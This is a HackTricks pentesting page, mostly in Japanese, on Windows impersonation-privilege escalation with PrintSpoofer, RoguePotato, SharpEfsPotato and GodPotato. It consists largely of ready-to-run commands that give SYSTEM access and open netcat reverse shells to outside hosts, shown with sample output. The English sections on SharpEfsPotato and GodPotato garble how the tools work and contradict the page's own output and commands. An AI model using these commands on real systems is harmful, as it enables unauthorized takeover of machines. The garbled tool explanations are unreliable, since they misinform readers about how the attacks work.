# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricksリポジトリ**と**hacktricks-cloudリポジトリ**にPRを提出して、あなたのハッキングトリックを共有してください。

</details>

{% hint style="warning" %}
**JuicyPotatoは**Windows Server 2019およびWindows 10ビルド1809以降では動作しません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)を使用して、同じ特権を利用し、`NT AUTHORITY\SYSTEM`レベルのアクセスを取得することができます。この[ブログ記事](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)では、JuicyPotatoが動作しないWindows 10およびServer 2019ホストで、`PrintSpoofer`ツールを使用して偽装特権を悪用する方法について詳しく説明しています。
{% endhint %}

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service in Windows to achieve local privilege escalation. It leverages the "RoguePotato" technique, which takes advantage of the Windows Print Spooler service to execute arbitrary code with SYSTEM privileges.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Download the tool from the [GitHub repository](https://github.com/itm4n/SharpEfsPotato).
2. Compile the source code using Visual Studio or use the precompiled binary.
3. Execute the tool with the following command:

```plaintext
SharpEfsPotato.exe
```

#### How it Works

SharpEfsPotato works by creating a rogue print server and a rogue printer. When the Print Spooler service starts, it loads a DLL file specified in the printer's configuration. By exploiting the DLL search order hijacking vulnerability, SharpEfsPotato can force the Print Spooler service to load a malicious DLL file with SYSTEM privileges.

#### Limitations

- SharpEfsPotato requires administrative privileges to create the rogue print server and printer.
- The target system must have the Print Spooler service enabled.
- The technique may not work on systems with certain security configurations or mitigations in place.

#### Mitigations

To mitigate the risks associated with SharpEfsPotato, consider the following measures:

- Disable the Print Spooler service if it is not required.
- Regularly apply security updates and patches to the operating system.
- Implement strong access controls and permissions to limit the impact of potential privilege escalation attacks.

#### Conclusion

SharpEfsPotato is a powerful tool for local privilege escalation on Windows systems. By exploiting the EFS service and the DLL search order hijacking vulnerability in the Print Spooler service, it can elevate privileges to SYSTEM level. However, it is important to use this tool responsibly and only in authorized penetration testing scenarios.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a tool that combines the power of RoguePotato and PrintSpoofer to achieve local privilege escalation on Windows systems. It takes advantage of the Windows Print Spooler service and the impersonation capabilities of the Distributed Component Object Model (DCOM) to execute arbitrary code with SYSTEM privileges.

To use GodPotato, you need to have a low-privileged user account on the target system. First, you need to download the RoguePotato and PrintSpoofer tools. RoguePotato is used to create a malicious DCOM object, while PrintSpoofer is used to exploit the Print Spooler service.

Once you have the tools, follow these steps:

1. Run RoguePotato with the following command to create a malicious DCOM object:
```
RoguePotato.exe -r <attacker_ip>:<attacker_port>
```
Replace `<attacker_ip>` and `<attacker_port>` with your IP address and the port you want to listen on.

2. Start a listener on your machine to receive the connection from the target system. For example, you can use netcat:
```
nc -nlvp <attacker_port>
```
Replace `<attacker_port>` with the same port you used in the previous step.

3. On the target system, run PrintSpoofer with the following command to exploit the Print Spooler service:
```
PrintSpoofer.exe -i -c <attacker_command>
```
Replace `<attacker_command>` with the command you want to execute on the target system.

4. If everything goes well, you should see a connection on your listener. You now have a shell with SYSTEM privileges on the target system.

It's important to note that GodPotato exploits a vulnerability in the Windows Print Spooler service, which has been patched by Microsoft. Therefore, this technique may not work on fully patched systems.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
